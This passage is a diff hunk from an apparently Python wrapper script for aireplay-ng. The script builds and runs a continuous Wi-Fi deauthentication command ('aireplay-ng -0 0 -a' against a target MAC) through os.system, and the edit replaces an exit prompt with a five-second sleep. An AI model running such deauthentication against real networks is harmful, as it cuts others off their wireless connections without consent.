@@ -47,7 +47,7 @@ command = 'aireplay-ng -0 0 -a ' + mac + ' ' + nm
 print(command)
 os.system(command)
 
-input('Please Enter To Exit : ')
+time.sleep(5)
 def end():
     foo=raw_input()
     sys.exit()
